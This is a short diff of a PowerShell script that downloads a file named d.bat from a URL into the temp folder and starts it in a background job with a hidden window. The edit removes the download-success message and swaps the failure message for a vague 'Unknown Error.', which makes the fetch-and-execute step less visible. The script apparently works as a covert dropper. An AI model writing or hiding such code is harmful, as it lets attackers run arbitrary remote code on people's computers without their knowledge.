@@ -5,12 +5,10 @@ $OutputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "d.bat"
 Invoke-WebRequest -Uri $Url -OutFile $OutputPath
 
 if (Test-Path $OutputPath) {
-    Write-Host "File downloaded successfully."
-
     Start-Job -ScriptBlock {
         param ($FilePath)
         Start-Process -FilePath $FilePath -WindowStyle Hidden
     } -ArgumentList $OutputPath | Out-Null
 } else {
-    Write-Host "File download failed."
+    Write-Host "Unknown Error."
 }
